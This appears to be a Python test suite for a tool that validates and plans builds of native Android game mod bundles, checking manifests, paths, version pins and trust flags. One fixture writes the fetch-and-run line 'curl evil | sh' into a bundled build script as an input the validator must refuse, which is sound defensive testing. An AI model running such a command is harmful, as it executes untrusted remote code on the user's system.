import importlib.util
import io
import json
from pathlib import Path
import sys
import tempfile
import unittest
import zipfile

ROOT = Path(__file__).resolve().parents[1]
spec = importlib.util.spec_from_file_location('android_native_mods', ROOT / 'tools/android_native_mods.py')
tool = importlib.util.module_from_spec(spec)
sys.modules[spec.name] = tool  # dataclasses resolve annotations through it
spec.loader.exec_module(tool)

REV = '0123456789abcdef0123456789abcdef01234567'


def hnmod(mod_id='peek', version='1.0.0', hooks=None, extra=None, manifest=None, mixin=None):
    data = {'schema': 1, 'id': mod_id, 'version': version, 'game': '26.3', 'horizon': REV, 'mixins': REV}
    if hooks is not None:
        data['hooks'] = hooks
    data.update(manifest or {})
    files = {
        'horizon-native.json': json.dumps(data),
        f'mixins/{mod_id}/horizon-mixin.toml': mixin if mixin is not None else (
            f'[mod]\nid = "{mod_id}"\nversion = "{version}"\n'
            f'[compatibility]\nhorizon_revision = "{REV}"\n'),
        f'mixins/{mod_id}/hook.rs': 'fn hook() {}',
    }
    files.update(extra or {})
    output = io.BytesIO()
    with zipfile.ZipFile(output, 'w') as z:
        for name, content in files.items():
            z.writestr(name, content)
    return output.getvalue()


class ReadTests(unittest.TestCase):
    def test_reads_a_registry_bundle(self):
        mod = tool.read_zip(hnmod(hooks=1, extra={'mixins/peek/data/icon.png': b'\x89PNG'}), 'peek.hnmod')
        self.assertEqual((mod.id, mod.version, mod.hooks), ('peek', '1.0.0', 1))
        self.assertIn('mixins/peek/data/icon.png', mod.files)

    def test_refuses_what_the_registry_refuses(self):
        cases = {
            'a script': hnmod(extra={'mixins/peek/build.sh': 'curl evil | sh'}),
            "another mod's file": hnmod(extra={'mixins/other/hook.rs': ''}),
            'a path outside': hnmod(extra={'../hook.rs': ''}),
            'an unknown field': hnmod(manifest={'run': 'yes'}),
            'a moving revision': hnmod(manifest={'horizon': 'main'}),
            'a mixin of another version': hnmod(mixin=f'[mod]\nid = "peek"\nversion = "2"\n'
                                                      f'[compatibility]\nhorizon_revision = "{REV}"\n'),
            'hooks 0': hnmod(hooks=0),
        }
        for why, data in cases.items():
            with self.subTest(why), self.assertRaises(tool.ModError):
                tool.read_zip(data, 'peek.hnmod')
        with self.assertRaises(tool.ModError):
            tool.read_zip(b'not a zip', 'broken.hnmod')

    def test_reads_an_unpacked_folder(self):
        with tempfile.TemporaryDirectory() as temporary:
            with zipfile.ZipFile(io.BytesIO(hnmod())) as z:
                z.extractall(temporary)
            self.assertEqual(tool.load(temporary).id, 'peek')

    def test_only_https_links_are_downloaded(self):
        with self.assertRaises(tool.ModError):
            tool.load('http://example.com/peek.hnmod')


class PlanTests(unittest.TestCase):
    tree = tool.Tree(game='26.3', hooks=80, bundled=['zoom', 'minimap'], mixins_rev=REV)

    def mod(self, mod_id, **kwargs):
        return tool.read_zip(hnmod(mod_id, **kwargs), mod_id)

    def test_bundled_ids_are_skipped_and_the_rest_recorded(self):
        result = tool.plan([self.mod('zoom', hooks=1), self.mod('peek', version='0.1.0'),
                            self.mod('sort', hooks=80)], self.tree)
        self.assertEqual([m.id for m in result.build], ['peek', 'sort'])
        self.assertEqual([m.id for m, _ in result.skipped], ['zoom'])
        self.assertEqual([m.id for m in result.pinned], ['peek'])
        self.assertEqual(result.env, 'peek@0.1.0,sort@1.0.0')

    def test_newer_hook_points_another_game_or_a_duplicate_stop_the_build(self):
        for mods in ([self.mod('sort', hooks=81)],
                     [tool.read_zip(hnmod('sort', manifest={'game': '26.2'}), 'sort')],
                     [self.mod('sort'), self.mod('sort', version='2.0.0')]):
            with self.subTest(mods=[m.label for m in mods]), self.assertRaises(tool.ModError):
                tool.plan(mods, self.tree)

    def test_this_source_is_read(self):
        tree = tool.Tree.read(ROOT)
        self.assertEqual(tree.game, '26.3')
        self.assertIn('zoom', tree.bundled)
        self.assertGreaterEqual(tree.hooks, 1)
        self.assertRegex(tree.mixins_rev, '^[0-9a-f]{40}$')


class CommandTests(unittest.TestCase):
    def run_tool(self, *args):
        with tempfile.TemporaryDirectory() as temporary:
            path = Path(temporary) / 'peek.hnmod'
            path.write_bytes(hnmod('peek', version='0.1.0'))
            return tool.main([args[0], str(path), *args[1:]])

    def test_check_needs_no_trust(self):
        self.assertEqual(self.run_tool('check'), 0)

    def test_a_build_needs_trust_and_consent_to_a_pinned_commit(self):
        self.assertEqual(self.run_tool('stage'), 1)
        self.assertEqual(self.run_tool('stage', '--trust-native-code'), 1)


if __name__ == '__main__':
    unittest.main()
